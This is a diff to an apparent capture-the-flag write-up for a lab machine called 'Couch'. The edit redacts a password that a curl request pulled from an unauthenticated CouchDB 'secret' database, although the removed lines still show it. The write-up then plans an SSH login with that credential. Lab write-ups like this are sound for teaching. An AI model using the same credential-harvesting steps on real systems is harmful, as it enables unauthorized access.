@@ -89,11 +89,11 @@ accessing secret database
 ```curl
 ┌──(root💀pc)-[/thm/Couch]
 └─# curl -XGET http://10.10.11.227:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
-{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}
+{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:<password hidden>"}
                                                                                                                       
 ```
 we got username and password 
-i.e.., atena:t4qfzcc4qN##
+i.e.., atena:<password hidden>
 
 Lets try to ssh into the machine
 
